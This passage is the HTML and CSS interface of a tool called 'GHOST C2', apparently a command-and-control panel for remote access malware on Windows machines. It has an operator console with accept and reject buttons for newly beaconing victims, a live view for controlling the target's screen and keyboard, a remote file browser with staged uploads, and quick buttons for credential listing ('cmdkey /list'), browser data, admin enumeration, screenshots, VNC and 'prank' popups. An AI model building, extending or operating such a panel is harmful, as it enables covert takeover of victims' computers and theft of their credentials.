  border-right:1px solid var(--line);background:rgba(8,12,24,.55);backdrop-filter:blur(12px)}
.pane-head{padding:12px 14px 10px;border-bottom:1px solid var(--line);flex-shrink:0}
.ph-row{display:flex;align-items:center;justify-content:space-between}
.pane-label{font-size:10px;font-weight:800;color:var(--txt2);text-transform:uppercase;letter-spacing:.18em}
.pill{font-size:10.5px;font-weight:700;font-family:var(--mono);color:var(--green);
  background:var(--green-dim);border:1px solid rgba(52,211,153,.22);padding:2px 9px;border-radius:99px}
.icon-btn{background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:14px;
  padding:3px 6px;line-height:1;transition:all .15s;border-radius:5px}
.icon-btn:hover{color:var(--acc);background:var(--acc-dim)}
.icon-btn.danger:hover{color:var(--red);background:var(--red-dim)}
.search{margin-top:10px;position:relative}
.search svg{position:absolute;left:10px;top:50%;transform:translateY(-50%);width:13px;height:13px;color:var(--faint);pointer-events:none}
#node-search{width:100%;background:rgba(6,10,20,.5);border:1px solid var(--line);border-radius:8px;
  color:var(--txt);padding:8px 10px 8px 30px;font-family:var(--mono);font-size:12px;outline:none;transition:all .18s}
#node-search:focus{border-color:rgba(63,210,247,.45);box-shadow:0 0 0 3px var(--acc-dim)}
#node-search::placeholder{color:var(--faint)}
#session-list{flex:1;overflow-y:auto;padding:6px 0}
.no-sessions{padding:44px 20px;color:var(--dim);font-size:12.5px;text-align:center;line-height:1.8}
.no-sessions .big{font-size:26px;opacity:.25;display:block;margin-bottom:10px}
.node{padding:12px 14px 11px;border-bottom:1px solid rgba(140,165,220,.05);cursor:pointer;
  position:relative;transition:background .15s;animation:nodeIn .3s ease both}
@keyframes nodeIn{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:none}}
.node:hover{background:rgba(63,210,247,.04)}
.node.active{background:linear-gradient(90deg,rgba(63,210,247,.10),rgba(63,210,247,.02))}
.node.active::before{content:'';position:absolute;left:0;top:8px;bottom:8px;width:2.5px;border-radius:3px;
  background:linear-gradient(180deg,var(--acc),var(--acc2));box-shadow:0 0 10px var(--acc-glow)}
.n-top{display:flex;align-items:center;gap:8px;margin-bottom:5px}
.n-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;background:var(--faint)}
.n-dot.live{background:var(--green);box-shadow:0 0 8px rgba(52,211,153,.7);animation:blip 2.2s infinite}
.n-dot.stale{background:var(--red)}
.n-dot.pending{background:var(--amber);box-shadow:0 0 8px rgba(251,191,36,.6)}
.n-host{font-size:12.5px;font-weight:700;font-family:var(--mono);color:var(--txt);flex:1;min-width:0;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.node.active .n-host{color:var(--acc)}
.nbadge{font-size:9px;font-weight:800;padding:2px 7px;border:1px solid;border-radius:99px;
  letter-spacing:.08em;flex-shrink:0;white-space:nowrap}
.nbadge.adm{border-color:rgba(251,113,133,.35);color:var(--red);background:var(--red-dim)}
.nbadge.live{border-color:rgba(52,211,153,.3);color:var(--green);background:var(--green-dim)}
.nbadge.stale{border-color:rgba(251,113,133,.25);color:var(--red);background:var(--red-dim)}
.nbadge.pending{border-color:rgba(251,191,36,.35);color:var(--amber);background:var(--amber-dim)}
.nbadge.tasks{border-color:rgba(63,210,247,.35);color:var(--acc);background:var(--acc-dim)}
.n-meta{display:flex;gap:6px;align-items:center;color:var(--dim);font-size:11px;font-family:var(--mono);
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:7px}
.n-meta .hi{color:var(--txt2)}
.n-fresh{display:flex;align-items:center;gap:8px}
.n-track{flex:1;height:2px;border-radius:2px;background:rgba(140,165,220,.10);overflow:hidden}
.n-fill{height:100%;border-radius:2px;background:var(--green);transition:width 1s linear,background .5s;
  box-shadow:0 0 6px rgba(52,211,153,.5)}
.n-fill.warn{background:var(--amber);box-shadow:0 0 6px rgba(251,191,36,.5)}
.n-fill.stale{background:var(--red);box-shadow:0 0 6px rgba(251,113,133,.5)}
.n-idle{font-size:10px;color:var(--dim);font-family:var(--mono);min-width:52px;text-align:right}

/* ── Main column ───────────────────────────────────────────────────────── */
#main{flex:1;display:flex;flex-direction:column;min-width:0;min-height:0}
#session-hero{display:none;align-items:center;gap:16px;padding:14px 20px;flex-shrink:0;
  border-bottom:1px solid var(--line);background:rgba(9,13,26,.5);backdrop-filter:blur(10px)}
.sh-id{min-width:0;flex:1}
.sh-name{display:flex;align-items:center;gap:11px;margin-bottom:6px}
.sh-host{font-size:16.5px;font-weight:800;font-family:var(--mono);letter-spacing:.01em;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.sh-chips{display:flex;gap:6px;flex-wrap:wrap}
.tchip{font-size:10px;font-weight:600;font-family:var(--mono);padding:3px 9px;border-radius:99px;
  border:1px solid var(--line);color:var(--txt2);background:var(--panel2);white-space:nowrap}
.tchip.ok{border-color:rgba(52,211,153,.3);color:var(--green);background:var(--green-dim)}
.tchip.warn{border-color:rgba(251,191,36,.32);color:var(--amber);background:var(--amber-dim)}
.tchip.bad{border-color:rgba(251,113,133,.32);color:var(--red);background:var(--red-dim)}
.tchip.acc{border-color:rgba(63,210,247,.32);color:var(--acc);background:var(--acc-dim)}
.sh-actions{display:flex;align-items:center;gap:7px;flex-shrink:0}
#sync-ind{font-size:10.5px;color:var(--dim);font-family:var(--mono);transition:color .4s;margin-right:5px}
.btn{background:var(--panel2);border:1px solid var(--line);color:var(--txt2);padding:7px 15px;
  font-family:var(--ui);font-size:12px;font-weight:600;cursor:pointer;transition:all .18s;border-radius:var(--r-md)}
.btn:hover{border-color:rgba(63,210,247,.45);color:var(--acc);background:var(--acc-dim)}
.btn.kill:hover{border-color:rgba(251,113,133,.5);color:var(--red);background:var(--red-dim)}
.btn.accept{border-color:rgba(52,211,153,.4);color:var(--green)}
.btn.accept:hover{border-color:var(--green);background:var(--green-dim);color:var(--green)}
.btn.reject{border-color:rgba(251,113,133,.4);color:var(--red)}
.btn.reject:hover{border-color:var(--red);background:var(--red-dim);color:var(--red)}
#pending-bar{display:none;align-items:center;gap:12px;padding:11px 20px;flex-shrink:0;
  background:linear-gradient(90deg,rgba(251,191,36,.08),transparent 70%);
  border-bottom:1px solid rgba(251,191,36,.18)}
.pending-msg{font-size:12.5px;color:var(--amber);flex:1;font-weight:600;display:flex;align-items:center;gap:9px}

/* ── Tabs ──────────────────────────────────────────────────────────────── */
#tabbar{display:flex;align-items:stretch;position:relative;border-bottom:1px solid var(--line);
  background:rgba(8,12,24,.45);flex-shrink:0;height:44px;padding:0 10px}
.tab{display:flex;align-items:center;gap:8px;padding:0 18px;font-size:11px;font-weight:700;
  letter-spacing:.1em;text-transform:uppercase;color:var(--dim);cursor:pointer;transition:color .18s;user-select:none}
.tab:hover{color:var(--txt2)}
.tab.active{color:var(--acc)}
.tab-badge{font-size:10px;font-family:var(--mono);background:var(--panel2);padding:1px 8px;
  border:1px solid var(--line);border-radius:99px;color:var(--dim)}
.tab.active .tab-badge{background:var(--acc-dim);border-color:rgba(63,210,247,.3);color:var(--acc)}
#tab-ind{position:absolute;bottom:-1px;height:2px;border-radius:2px;
  background:linear-gradient(90deg,var(--acc),var(--acc2));box-shadow:0 0 10px var(--acc-glow);
  transition:left .25s cubic-bezier(.6,0,.2,1),width .25s cubic-bezier(.6,0,.2,1)}
.tab-right{margin-left:auto;display:flex;align-items:center;gap:8px;padding-right:6px}

/* ── Content areas ─────────────────────────────────────────────────────── */
#empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
  gap:18px;color:var(--dim);position:relative}
.empty-glyph{width:74px;height:74px;opacity:.16;animation:hover 5s ease-in-out infinite}
@keyframes hover{0%,100%{transform:translateY(0)}50%{transform:translateY(-9px)}}
.empty-msg{font-size:13px;font-weight:600;letter-spacing:.14em;text-transform:uppercase;opacity:.55}
.empty-sub{font-size:11.5px;color:var(--faint);font-family:var(--mono)}
#console{flex:1;overflow-y:auto;display:none;flex-direction:column;min-height:0;padding:6px 0 18px}
.result-entry{margin:10px 16px 0;border:1px solid var(--line);border-radius:12px;overflow:hidden;
  flex-shrink:0;background:rgba(9,13,26,.5);animation:fi .7s ease}
@keyframes fi{0%{border-color:rgba(63,210,247,.4);box-shadow:0 0 18px rgba(63,210,247,.08)}100%{border-color:var(--line);box-shadow:none}}
.result-hdr{padding:7px 12px 7px 14px;background:rgba(15,21,38,.5);display:flex;align-items:center;gap:12px;
  border-bottom:1px solid var(--line);font-family:var(--mono)}
.r-idx{color:var(--faint);font-size:10.5px;font-weight:700;min-width:30px}
.r-label{font-size:9px;font-weight:800;letter-spacing:.14em;padding:2.5px 9px;border-radius:99px;border:1px solid}
.r-label.out{color:var(--acc);border-color:rgba(63,210,247,.3);background:var(--acc-dim)}
.r-label.shot{color:var(--violet);border-color:rgba(167,139,250,.35);background:var(--violet-dim)}
.r-ts{color:var(--dim);font-size:10.5px;flex:1}
.r-len{color:var(--faint);font-size:10.5px}
.r-copy{background:transparent;border:1px solid var(--line);color:var(--dim);font-family:var(--mono);
  font-size:10px;cursor:pointer;padding:2.5px 10px;transition:all .15s;border-radius:6px;letter-spacing:.06em}
.r-copy:hover{color:var(--acc);border-color:rgba(63,210,247,.4);background:var(--acc-dim)}
.result-body{padding:12px 14px 13px;white-space:pre-wrap;word-break:break-word;color:var(--txt);
  line-height:1.8;font-size:12.5px;font-family:var(--mono)}
.result-body img{max-width:100%;border:1px solid var(--line2);border-radius:8px;display:block}
.ln{display:flex;min-height:1.8em}
.ln-num{min-width:30px;text-align:right;color:var(--faint);font-size:10.5px;user-select:none;
  padding-right:13px;line-height:1.8;flex-shrink:0}
.ln-txt{flex:1;word-break:break-word}
.console-empty{margin:22px 16px;padding:30px;border:1px dashed rgba(140,165,220,.14);border-radius:14px;
  flex-shrink:0;text-align:center;color:var(--faint);font-size:12px;font-family:var(--mono)}

/* ── Recon ─────────────────────────────────────────────────────────────── */
#recon{flex:1;overflow-y:auto;display:none;min-height:0;padding:20px}
.rc-section{margin-bottom:18px}
.rc-title{font-size:10px;font-weight:800;letter-spacing:.2em;color:var(--dim);text-transform:uppercase;
  margin-bottom:10px;display:flex;align-items:center;gap:10px}
.rc-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--line),transparent)}
.rc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(205px,1fr));gap:9px}
.rc-cell{border:1px solid var(--line);padding:13px 15px;background:rgba(11,16,30,.5);
  border-radius:12px;transition:border-color .18s,transform .18s}
.rc-cell:hover{border-color:var(--line2);transform:translateY(-1px)}
.rc-key{font-size:9.5px;font-weight:700;letter-spacing:.14em;color:var(--dim);text-transform:uppercase;margin-bottom:7px;
  display:flex;align-items:center;gap:7px}
.rc-key svg{width:12px;height:12px;opacity:.7}
.rc-val{font-size:13px;color:var(--txt);word-break:break-all;font-weight:600;font-family:var(--mono)}
.rc-val.ok{color:var(--green)}.rc-val.warn{color:var(--amber)}.rc-val.bad{color:var(--red)}.rc-val.acc{color:var(--acc)}
.rc-big.ok{color:var(--green)}.rc-big.bad{color:var(--red)}
.rc-evas{display:flex;gap:9px}
.rc-evas .rc-cell{flex:1;text-align:center;padding:16px 10px}
.rc-big{font-size:17px;font-weight:800;font-family:var(--mono)}

/* ── Command bar ───────────────────────────────────────────────────────── */
#cmdbar{border-top:1px solid var(--line);background:rgba(9,13,26,.72);backdrop-filter:blur(14px);
  display:none;flex-shrink:0}
.cmd-row{display:flex;align-items:stretch;border-bottom:1px solid var(--line)}
.cmd-prompt{display:flex;align-items:center;color:var(--green);font-size:12px;padding:0 14px;flex-shrink:0;
  border-right:1px solid var(--line);background:rgba(15,21,38,.4);user-select:none;font-weight:700;font-family:var(--mono)}
.cmd-prompt .host{color:var(--acc)}
#cmd-input{flex:1;background:transparent;border:none;color:var(--txt);padding:13px 16px;
  font-family:var(--mono);font-size:13px;outline:none;caret-color:var(--acc)}
#cmd-input::placeholder{color:var(--faint)}
.cmd-exec{background:linear-gradient(92deg,var(--acc),#69c8ff);border:none;color:#031018;padding:0 24px;
  font-family:var(--ui);font-size:12px;font-weight:800;letter-spacing:.06em;cursor:pointer;transition:all .2s}
.cmd-exec:hover{box-shadow:0 0 18px rgba(63,210,247,.3)}
.cmd-hints{display:flex;align-items:center;gap:12px;padding:0 14px;border-left:1px solid var(--line);
  color:var(--faint);font-size:10px;font-family:var(--mono);white-space:nowrap}
.quick-cmds{display:flex;gap:6px;overflow-x:auto;padding:9px 14px;scrollbar-width:thin}
.qcmd{background:rgba(6,10,20,.4);border:1px solid var(--line);color:var(--txt2);padding:4.5px 13px;
  font-family:var(--mono);font-size:11px;font-weight:500;cursor:pointer;transition:all .16s;
  white-space:nowrap;flex-shrink:0;border-radius:99px}
.qcmd:hover{border-color:rgba(63,210,247,.45);color:var(--acc);background:var(--acc-dim);transform:translateY(-1px)}
.qcmd.danger{color:var(--red);border-color:rgba(251,113,133,.28)}
.qcmd.danger:hover{background:var(--red-dim);border-color:rgba(251,113,133,.5);color:var(--red)}

/* ── Right rail ────────────────────────────────────────────────────────── */
#rail-right{width:326px;flex-shrink:0;display:flex;flex-direction:column;min-height:0;
  border-left:1px solid var(--line);background:rgba(8,12,24,.55);backdrop-filter:blur(12px)}
#rail-tabs{display:flex;border-bottom:1px solid var(--line);flex-shrink:0}
.rtab{flex:1;padding:11px 0;text-align:center;font-size:10px;font-weight:800;letter-spacing:.16em;
  text-transform:uppercase;color:var(--dim);cursor:pointer;transition:all .18s;border-bottom:2px solid transparent}
.rtab:hover{color:var(--txt2)}
.rtab.active{color:var(--acc);border-bottom-color:var(--acc)}
#feed{flex:1;overflow-y:auto;display:none;flex-direction:column}
.audit-entry{display:flex;gap:11px;padding:11px 14px;border-bottom:1px solid rgba(140,165,220,.05);
  transition:background .15s;animation:nodeIn .3s ease both}
.audit-entry:hover{background:rgba(63,210,247,.035)}
.a-ico{width:26px;height:26px;border-radius:8px;display:flex;align-items:center;justify-content:center;
  flex-shrink:0;font-size:11px;font-family:var(--mono);font-weight:800;border:1px solid var(--line);color:var(--dim)}
.a-body{min-width:0;flex:1}
.a-action{font-size:12px;font-weight:700;letter-spacing:.02em;margin-bottom:2px}
.a-sid{color:var(--dim);font-size:10.5px;word-break:break-all;font-family:var(--mono)}
.a-ip{color:var(--faint);font-size:10px;font-family:var(--mono);margin-top:1px}
.a-time{font-size:9.5px;color:var(--faint);font-family:var(--mono);white-space:nowrap;margin-left:auto;flex-shrink:0}
.a-btns{display:flex;gap:6px;margin-top:7px}
.a-btn{background:transparent;border:1px solid;padding:3px 12px;font-family:var(--ui);font-size:10.5px;
  font-weight:700;cursor:pointer;border-radius:6px;transition:all .15s;letter-spacing:.06em}
.a-btn.accept{border-color:rgba(52,211,153,.35);color:var(--green)}
.a-btn.accept:hover{background:var(--green-dim)}
.a-btn.reject{border-color:rgba(251,113,133,.35);color:var(--red)}
.a-btn.reject:hover{background:var(--red-dim)}
.no-audit{padding:40px 18px;color:var(--faint);font-size:12px;text-align:center;line-height:1.8}

/* ── Payload ───────────────────────────────────────────────────────────── */
#payload-pane{flex:1;overflow-y:auto;display:none;flex-direction:column;padding:16px 14px;gap:14px}
.drop{border:1.5px dashed rgba(140,165,220,.22);border-radius:14px;padding:30px 18px;text-align:center;
  cursor:pointer;transition:all .2s;background:rgba(6,10,20,.3)}
.drop:hover,.drop.over{border-color:rgba(63,210,247,.55);background:var(--acc-dim);
  box-shadow:0 0 26px rgba(63,210,247,.09) inset}
.drop svg{width:30px;height:30px;color:var(--dim);margin-bottom:10px;transition:color .2s}
.drop:hover svg,.drop.over svg{color:var(--acc)}
.drop .d1{font-size:12.5px;font-weight:700;color:var(--txt2);margin-bottom:4px}
.drop .d2{font-size:10.5px;color:var(--faint);font-family:var(--mono)}
.pl-card{border:1px solid var(--line);border-radius:12px;padding:14px;background:rgba(11,16,30,.55)}
.pl-row{display:flex;justify-content:space-between;margin-bottom:6px;font-size:11.5px}
.pl-row .k{color:var(--dim);letter-spacing:.06em;font-size:10px;font-weight:700;text-transform:uppercase}
.pl-row .v{font-family:var(--mono);color:var(--txt);font-weight:600}
.pl-note{font-size:10.5px;color:var(--faint);line-height:1.7;font-family:var(--mono);
  border:1px solid var(--line);border-radius:10px;padding:10px 12px;background:rgba(6,10,20,.3)}

/* ── Toasts ────────────────────────────────────────────────────────────── */
#toasts{position:fixed;top:70px;right:18px;display:flex;flex-direction:column;gap:9px;z-index:9998;pointer-events:none}
.toast{display:flex;align-items:center;gap:10px;background:rgba(13,19,34,.92);backdrop-filter:blur(12px);
  border:1px solid var(--line2);border-radius:11px;padding:11px 16px;font-size:12.5px;font-weight:600;
  box-shadow:0 12px 34px rgba(0,0,0,.5);animation:tIn .28s cubic-bezier(.16,1,.3,1) both;max-width:360px}
.toast.out{animation:tOut .25s ease both}
@keyframes tIn{from{opacity:0;transform:translateX(24px)}to{opacity:1;transform:none}}
@keyframes tOut{to{opacity:0;transform:translateX(24px)}}
.toast .tico{width:20px;height:20px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.toast.ok .tico{background:var(--green-dim);color:var(--green)}
.toast.err .tico{background:var(--red-dim);color:var(--red)}
.toast.warn .tico{background:var(--amber-dim);color:var(--amber)}
.toast.info .tico{background:var(--acc-dim);color:var(--acc)}
.toast.err{border-color:rgba(251,113,133,.35)}.toast.warn{border-color:rgba(251,191,36,.35)}

/* ── Modal ─────────────────────────────────────────────────────────────── */
#modal-ov{position:fixed;inset:0;background:rgba(3,5,10,.7);backdrop-filter:blur(6px);z-index:9990;
  display:none;align-items:center;justify-content:center}
#modal-ov.show{display:flex;animation:fadeIn .18s ease}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.modal{width:min(400px,90vw);background:rgba(13,19,34,.97);border:1px solid var(--line2);border-radius:16px;
  padding:26px;animation:rise .25s cubic-bezier(.16,1,.3,1) both;
  box-shadow:0 30px 90px rgba(0,0,0,.6)}
.modal h3{font-size:15px;font-weight:800;margin-bottom:9px;letter-spacing:.02em}
.modal p{font-size:12.5px;color:var(--txt2);line-height:1.7;margin-bottom:22px;font-family:var(--mono);word-break:break-all}
.modal .m-btns{display:flex;gap:9px;justify-content:flex-end}
.modal .m-cancel{background:transparent;border:1px solid var(--line);color:var(--txt2);padding:9px 18px;
  border-radius:9px;font-family:var(--ui);font-size:12.5px;font-weight:600;cursor:pointer;transition:all .15s}
.modal .m-cancel:hover{border-color:var(--line2);color:var(--txt)}
.modal .m-ok{border:none;border-radius:9px;padding:9px 20px;font-family:var(--ui);font-size:12.5px;
  font-weight:700;cursor:pointer;transition:all .15s;background:var(--acc);color:#031018}
.modal .m-ok.danger{background:var(--red);color:#fff}
.modal .m-ok:hover{opacity:.85}

/* ── Command palette ───────────────────────────────────────────────────── */
#palette-ov{position:fixed;inset:0;background:rgba(3,5,10,.6);backdrop-filter:blur(5px);z-index:9995;
  display:none;justify-content:center;align-items:flex-start;padding-top:13vh}
#palette-ov.show{display:flex;animation:fadeIn .15s ease}
.palette{width:min(560px,92vw);background:rgba(13,19,34,.97);border:1px solid var(--line2);border-radius:16px;
  overflow:hidden;box-shadow:0 30px 90px rgba(0,0,0,.65);animation:rise .22s cubic-bezier(.16,1,.3,1) both}
.pal-in{display:flex;align-items:center;gap:11px;padding:15px 18px;border-bottom:1px solid var(--line)}
.pal-in svg{width:16px;height:16px;color:var(--dim);flex-shrink:0}
#pal-input{flex:1;background:transparent;border:none;outline:none;color:var(--txt);
  font-family:var(--mono);font-size:14px}
#pal-input::placeholder{color:var(--faint)}
#pal-list{max-height:330px;overflow-y:auto;padding:7px}
.pal-group{font-size:9px;font-weight:800;letter-spacing:.2em;color:var(--faint);text-transform:uppercase;
  padding:9px 12px 5px}
.pal-item{display:flex;align-items:center;gap:11px;padding:9px 12px;border-radius:9px;cursor:pointer;
  font-size:12.5px;color:var(--txt2)}
.pal-item svg{width:14px;height:14px;flex-shrink:0;opacity:.7}
.pal-item .pi-sub{margin-left:auto;font-size:10px;color:var(--faint);font-family:var(--mono)}
.pal-item.active{background:var(--acc-dim);color:var(--acc)}
.pal-item.active svg{opacity:1}
.pal-empty{padding:26px;text-align:center;color:var(--faint);font-size:12px;font-family:var(--mono)}

/* ── File browser ──────────────────────────────────────────────────────── */
#files-pane{flex:1;overflow-y:auto;display:none;min-height:0;padding:14px 16px}
.fbar{display:flex;gap:8px;margin-bottom:12px}
#files-path{flex:1;background:rgba(6,10,20,.5);border:1px solid var(--line);border-radius:8px;
  color:var(--txt);padding:8px 12px;font-family:var(--mono);font-size:12px;outline:none;transition:border-color .18s}
#files-path:focus{border-color:rgba(63,210,247,.45)}
.frow{display:flex;align-items:center;gap:10px;padding:7px 12px;border-bottom:1px solid rgba(140,165,220,.05);
  font-family:var(--mono);font-size:12px;color:var(--txt);transition:background .12s;border-radius:6px}
.frow:hover{background:rgba(63,210,247,.04)}
.frow .fi{width:18px;text-align:center;flex-shrink:0}
.frow .fn{flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;cursor:pointer}
.frow .fn:hover{color:var(--acc)}
.frow .fs{color:var(--dim);min-width:80px;text-align:right}
.frow .fd{color:var(--faint);min-width:110px;text-align:right;font-size:10.5px}
.frow .fdl{background:transparent;border:1px solid var(--line);color:var(--txt2);font-family:var(--mono);
  font-size:10px;padding:2px 10px;border-radius:6px;cursor:pointer;transition:all .15s;flex-shrink:0}
.frow .fdl:hover{color:var(--acc);border-color:rgba(63,210,247,.4);background:var(--acc-dim)}
.files-empty{padding:34px;text-align:center;color:var(--faint);font-family:var(--mono);font-size:12px}

/* ── Live view ─────────────────────────────────────────────────────────── */
#btn-live.live-on{border-color:rgba(251,113,133,.5);color:var(--red);background:var(--red-dim)}
#live-view{flex:1;min-height:0;display:none;flex-direction:column;background:#020409;padding:8px 12px 12px;
  cursor:crosshair;outline:none}
.live-head{display:flex;align-items:center;gap:10px;padding:2px 2px 9px;font-family:var(--mono)}
.live-dot{width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 10px rgba(251,113,133,.8);animation:blip 1s infinite}
.live-head .lbl{font-size:10px;font-weight:800;letter-spacing:.2em;color:var(--red)}
#live-ts{font-size:10.5px;color:var(--dim)}
.lv-hint{margin-left:auto;font-size:10px;color:var(--faint);font-family:var(--mono)}
#live-img{flex:1;min-height:0;width:100%;object-fit:contain;border:1px solid var(--line);border-radius:10px;background:#000}
</style></head><body>
<div class="bg"></div>
<header>
  <div class="brand">
    <div class="mark"><svg viewBox="0 0 24 24" fill="none" stroke="url(#lg2)" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <defs><linearGradient id="lg2" x1="0" y1="0" x2="24" y2="24"><stop offset="0" stop-color="#3fd2f7"/><stop offset="1" stop-color="#8b7cf7"/></linearGradient></defs>
      <path d="M12 2.5c-4.6 0-7.5 3.4-7.5 8v9.2c0 .9 1 1.4 1.7.8l1.9-1.6c.4-.3 1-.3 1.4 0l1.6 1.4c.5.4 1.3.4 1.8 0l1.6-1.4c.4-.3 1-.3 1.4 0l1.9 1.6c.7.6 1.7.1 1.7-.8V10.5c0-4.6-2.9-8-7.5-8Z"/>
      <circle cx="9.2" cy="10.2" r="1" fill="#3fd2f7" stroke="none"/><circle cx="14.8" cy="10.2" r="1" fill="#8b7cf7" stroke="none"/>
    </svg></div>
    <div class="bname">GHOST <b>C2</b></div>
  </div>
  <div class="hsep"></div>
  <div class="chip"><span class="pulse" id="pulse"></span><span class="lbl" id="status-txt">Idle</span></div>
  <div class="hsep"></div>
  <div class="chip"><span class="lbl">Nodes</span><span class="val" id="st-nodes">0</span></div>
  <div class="chip"><span class="lbl">Pending</span><span class="val" id="st-pending">0</span></div>
  <div class="chip"><span class="lbl">Queued</span><span class="val" id="st-queued">0</span></div>
  <div class="chip"><span class="lbl">Link</span><span class="val" id="st-link">—</span></div>
  <div class="chip"><span class="lbl">Last beacon</span><span class="val" id="st-beacon">—</span></div>
  <div class="hright">
    <button class="hbtn" onclick="openPalette()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.8-3.8"/></svg>Search <kbd>Ctrl K</kbd></button>
    <span id="clock"></span>
    <button class="hbtn danger" onclick="logout()">Sign out</button>
  </div>
</header>
<div class="workspace">
  <div id="rail-sessions">
    <div class="pane-head">
      <div class="ph-row">
        <span class="pane-label">Nodes</span>
        <div style="display:flex;align-items:center;gap:7px">
          <span class="pill" id="node-count">0</span>
          <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
        </div>
      </div>
      <div class="search">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.8-3.8"/></svg>
        <input id="node-search" placeholder="filter host / user / ip…" oninput="renderSessions()">
      </div>
    </div>
    <div id="session-list"><div class="no-sessions"><span class="big">&#x25c8;</span>Awaiting connections&hellip;</div></div>
  </div>
  <div id="main">
    <div id="session-hero">
      <div class="sh-id">
        <div class="sh-name"><span class="sh-host" id="sh-host"></span><span id="sh-status"></span></div>
        <div class="sh-chips" id="sh-chips"></div>
      </div>
      <div class="sh-actions">
        <span id="sync-ind"></span>
        <button id="btn-accept-hdr" class="btn accept" style="display:none" onclick="acceptSelected()">Accept</button>
        <button id="btn-reject-hdr" class="btn reject" style="display:none" onclick="rejectSelected()">Reject</button>
        <button class="btn" id="btn-live" onclick="toggleLive()">Live</button>
        <button class="btn" onclick="clearResults()">Clear</button>
        <button class="btn" onclick="fetchResults(true)">Refresh</button>
        <button class="btn kill" onclick="killSession()">Kill</button>
      </div>
    </div>
    <div id="pending-bar">
      <span class="pending-msg"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v4m0 4h.01M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z"/></svg>Awaiting operator approval</span>
      <button class="btn accept" onclick="acceptSelected()">Accept</button>
      <button class="btn reject" onclick="rejectSelected()">Reject</button>
    </div>
    <div id="tabbar" style="display:none">
      <div class="tab active" data-tab="console" onclick="switchTab('console')">Console <span class="tab-badge" id="tc-output">0</span></div>
      <div class="tab" data-tab="recon" onclick="switchTab('recon')">Recon</div>
      <div class="tab" data-tab="files" onclick="switchTab('files')">Files</div>
      <div id="tab-ind"></div>
    </div>
    <div id="empty-state">
      <svg class="empty-glyph" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 2.5c-4.6 0-7.5 3.4-7.5 8v9.2c0 .9 1 1.4 1.7.8l1.9-1.6c.4-.3 1-.3 1.4 0l1.6 1.4c.5.4 1.3.4 1.8 0l1.6-1.4c.4-.3 1-.3 1.4 0l1.9 1.6c.7.6 1.7.1 1.7-.8V10.5c0-4.6-2.9-8-7.5-8Z"/>
        <circle cx="9.2" cy="10.2" r="1" fill="currentColor"/><circle cx="14.8" cy="10.2" r="1" fill="currentColor"/>
      </svg>
      <div class="empty-msg">Select a node</div>
      <div class="empty-sub">or press <kbd>Ctrl K</kbd> to search</div>
    </div>
    <div id="console"></div>
    <div id="recon"></div>
    <div id="files-pane">
      <div class="fbar">
        <button class="btn" onclick="openFiles(parentPath(filesCwd))">&#8679;</button>
        <input id="files-path" placeholder="C:\path — empty + Go lists drives" onkeydown="if(event.key==='Enter')openFiles(this.value)">
        <button class="btn" onclick="openFiles(document.getElementById('files-path').value)">Go</button>
        <button class="btn" onclick="pushStaged()">&#8679; Push staged</button>
      </div>
      <div id="files-list"><div class="files-empty">Select a node, then Go — empty path lists drives</div></div>
    </div>
    <div id="live-view" tabindex="0"><div class="live-head"><span class="live-dot"></span><span class="lbl">LIVE VIEW</span><span id="live-ts"></span><span class="lv-hint">click = control target &middot; keys go to target &middot; ~2s frames</span></div><img id="live-img" alt="live screen" draggable="false"></div>
    <div id="cmdbar">
      <div class="cmd-row">
        <span class="cmd-prompt">ghost<span style="color:var(--faint)">://</span><span class="host" id="cmd-host">node</span>&gt;</span>
        <input id="cmd-input" placeholder="Enter command…" onkeydown="handleKey(event)">
        <button class="cmd-exec" onclick="sendCmd()">RUN</button>
        <div class="cmd-hints"><span><kbd>/</kbd> focus</span></div>
      </div>
      <div class="quick-cmds">
        <button class="qcmd" onclick="sendCmd('whoami /all')">whoami</button>
        <button class="qcmd" onclick="sendCmd('ipconfig /all')">ipconfig</button>
        <button class="qcmd" onclick="sendCmd('systeminfo')">sysinfo</button>
        <button class="qcmd" onclick="sendCmd('tasklist /v')">tasklist</button>
        <button class="qcmd" onclick="sendCmd('!ps')">ps</button>
        <button class="qcmd" onclick="sendCmd('netstat -ano')">netstat</button>
        <button class="qcmd" onclick="sendCmd('!screenshot')">screenshot</button>
        <button class="qcmd" onclick="cmdInsert('!vnc ')">vnc</button>
        <button class="qcmd" onclick="cmdInsert('ps1 ')">ps1</button>
        <button class="qcmd" onclick="sendCmd('psreset')">psreset</button>
        <button class="qcmd" onclick="cmdInsert('!prank ')">prank</button>
        <button class="qcmd" onclick="sendCmd('!popups')">popups</button>
        <button class="qcmd" onclick="sendCmd('net user')">net user</button>
        <button class="qcmd" onclick="sendCmd('net localgroup administrators')">local admins</button>
        <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
        <button class="qcmd" onclick="sendCmd('arp -a')">arp</button>
        <button class="qcmd" onclick="sendCmd('route print')">routes</button>
        <button class="qcmd" onclick="sendCmd('cmdkey /list')">creds</button>
        <button class="qcmd" onclick="sendCmd('!getpid')">getpid</button>
        <button class="qcmd" onclick="sendCmd('!env')">env</button>
      </div>
    </div>
